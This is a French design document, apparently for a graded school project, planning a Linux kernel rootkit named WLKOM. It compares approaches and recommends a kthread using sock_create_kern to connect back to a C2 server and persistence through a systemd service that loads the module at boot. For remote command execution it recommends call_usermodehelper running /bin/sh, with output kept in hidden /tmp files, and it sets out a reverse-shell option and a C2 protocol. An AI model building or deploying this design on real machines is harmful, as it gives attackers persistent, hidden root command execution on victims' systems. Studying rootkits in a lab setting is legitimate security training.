# WLKOM — Document de conception

Approches possibles pour chaque feature **obligatoire**.
Pour chaque feature : comparatif, recommandation, risques.

---

## Feature 1 — Compile (0.5pt)

Une seule approche raisonnable : **Makefile LKM standard** ciblant `wlkom.ko`.

```makefile
obj-m += wlkom.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

**Prérequis sur la victim VM :**
- `linux-headers-$(uname -r)` (Debian/Ubuntu) ou `linux-headers` (Arch)
- `build-essential` / `base-devel`
- `gcc`

**Risques :** aucun si les headers correspondent exactement à la version du kernel en cours d'exécution. Si le kernel est mis à jour sans mettre à jour les headers → recompiler.

---

## Feature 2 — Connection (3pt)

Le rootkit doit initier une connexion TCP vers le C2 (reverse connection), la maintenir, et retry si elle tombe.

### Approche A — Socket kernel avec `sock_create_kern` ✅ Recommandé

Le rootkit crée un `kthread` au chargement. Ce thread tourne en boucle :
1. Tente `sock_create_kern` + `kernel_connect` vers l'IP/port du C2
2. Si succès → maintient la connexion (bloqué sur `kernel_recvmsg` en attente de commandes)
3. Si échec ou déconnexion → `msleep(30000)` puis retry

```c
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>

// IP/port passés en module_param
static char *c2_ip = "192.168.1.100";
static int   c2_port = 4444;
module_param(c2_ip, charp, 0);
module_param(c2_port, int, 0);
```

| Critère | Note |
|---|---|
| Simplicité | Moyenne — API kernel ésotérique mais bien documentée |
| Robustesse | Haute — tout dans le kernel, pas de dépendance user-space |
| Scalabilité | Haute — le même socket sert pour les commandes |

**Risques :**
- `kernel_connect` est bloquant par défaut → obligatoire de l'appeler depuis un kthread, pas depuis `init`
- Le kthread doit checker `kthread_should_stop()` dans sa boucle pour pouvoir être arrêté proprement au `rmmod`
- Certains kernels récents nécessitent `allow_signal(SIGKILL)` dans le thread

---

### Approche B — `call_usermodehelper` pour lancer un binaire user-space

Au `init`, utiliser `call_usermodehelper` pour lancer un script shell ou Python qui gère la connexion TCP.

| Critère | Note |
|---|---|
| Simplicité | Haute — pas d'API réseau kernel |
| Robustesse | Faible — dépend d'un binaire user-space présent sur le système |
| Scalabilité | Faible — difficile de faire transiter les I/O entre kernel et user |

**Non recommandé** : casse le modèle "tout dans le kernel" ; difficile de remonter stdout/stderr des commandes.

---

### Approche C — Netlink socket (kernel ↔ daemon user-space)

Le kernel module communique via Netlink avec un daemon user-space qui gère le TCP.

| Critère | Note |
|---|---|
| Simplicité | Basse — protocole Netlink verbeux et complexe |
| Robustesse | Haute |
| Scalabilité | Moyenne |

**Non recommandé** pour ce projet : sur-complexité inutile, deux composants à maintenir.

---

## Feature 3 — Persistence (1.5pt)

Le rootkit doit survivre à un reboot **et** se reconnecter au C2.

### Approche A — Systemd service ✅ Recommandé

Créer `/etc/systemd/system/wlkom.service` :

```ini
[Unit]
Description=WLKOM
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/sbin/insmod /lib/modules/VERSION/extra/wlkom.ko c2_ip=X.X.X.X c2_port=4444
Type=oneshot
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
```

```bash
cp wlkom.ko /lib/modules/$(uname -r)/extra/
depmod -a
systemctl enable wlkom
```

| Critère | Note |
|---|---|
| Simplicité | Haute |
| Robustesse | Haute — `After=network-online.target` garantit le réseau avant la connexion |
| Discrétion | Faible (service visible avec `systemctl list-units`) |

**Risques :** si la victim VM n'a pas systemd (peu probable) → fallback approche B.

---

### Approche B — `/etc/modules` + `/etc/modprobe.d/`

Ajouter `wlkom` dans `/etc/modules` et les paramètres dans `/etc/modprobe.d/wlkom.conf`.

```
# /etc/modprobe.d/wlkom.conf
options wlkom c2_ip=X.X.X.X c2_port=4444
```

| Critère | Note |
|---|---|
| Simplicité | Haute |
| Robustesse | Moyenne — ordre de chargement non garanti, réseau peut ne pas être up |
| Discrétion | Faible |

**Non recommandé** : pas de garantie que le réseau est disponible au moment du chargement.

---

### Approche C — Cron `@reboot`

```cron
@reboot root insmod /path/to/wlkom.ko c2_ip=X.X.X.X
```

| Critère | Note |
|---|---|
| Simplicité | Haute |
| Robustesse | Faible — cron démarre tôt, souvent avant le réseau |
| Discrétion | Faible |

**Non recommandé.**

---

## Feature 4 — Executing commands (5pt)

Depuis le C2, envoyer une commande shell ; le rootkit l'exécute et renvoie stdout, stderr, exit code.

### Approche A — `call_usermodehelper` + fichiers temporaires ✅ Recommandé

1. Le C2 envoie la commande via le socket (ex: `CMD id\n`)
2. Le kthread du rootkit construit : `"/bin/sh -c 'id > /tmp/.wk_o 2>/tmp/.wk_e; echo $? > /tmp/.wk_x'"`
3. `call_usermodehelper` exécute ce one-liner (flag `UMH_WAIT_PROC`)
4. Lire `/tmp/.wk_o`, `/tmp/.wk_e`, `/tmp/.wk_x` via `filp_open` + `kernel_read`
5. Envoyer le contenu au C2 via `kernel_sendmsg`

```c
char *argv[] = { "/bin/sh", "-c", cmd_buf, NULL };
char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL };
call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```

| Critère | Note |
|---|---|
| Simplicité | Haute — pas de pipe kernel |
| Robustesse | Moyenne — race condition si deux commandes simultanées |
| Capture output | Via fichiers `/tmp` lus avec `filp_open` |

**Risques :**
- Les fichiers `/tmp/.wk_*` sont visibles en user-space → les supprimer après lecture, ou utiliser un chemin caché (ex: `/dev/shm/.wk`)
- Pas de concurrence : traiter les commandes séquentiellement dans le kthread
- Taille des outputs limités par la taille du buffer alloué → tronquer si nécessaire

---

### Approche B — `call_usermodehelper` + pipes anonymes

Créer des pipes en kernel space, y attacher le process fils, lire le stdout/stderr directement en mémoire.

| Critère | Note |
|---|---|
| Simplicité | Basse — gestion des pipes en kernel space très complexe |
| Robustesse | Haute en théorie |
| Capture output | Directement en mémoire, propre |

**Non recommandé** pour démarrer : complexité injustifiée, très peu d'exemples disponibles.

---

### Approche C — Reverse shell `/bin/sh` sur le socket

Rediriger stdin/stdout/stderr du shell directement vers le socket TCP.

```c
// dupliquer le fd du socket vers 0, 1, 2 du process fils
```

| Critère | Note |
|---|---|
| Simplicité | Moyenne |
| Robustesse | Haute — I/O directe |
| Capture output | stdout et stderr mélangés, pas de exit code séparé |

**Acceptable** si on accepte de ne pas séparer stdout/stderr — mais perd des points sur la spec (qui demande stdout, stderr, et exit code séparément).

---

## Protocole réseau recommandé

Texte simple, messages délimités par `\n` :

```
# C2 → Rootkit
CMD <commande shell>\n
AUTH <password>\n

# Rootkit → C2
CONNECTED\n
OUT <contenu stdout encodé base64>\n
ERR <contenu stderr encodé base64>\n
EXIT <code>\n
```

Utiliser base64 pour les outputs évite les problèmes avec les `\n` dans les sorties de commandes.
Pour le chiffrement (feature optionnelle) : wrapper XOR ou AES-128-CTR par-dessus ce protocole.
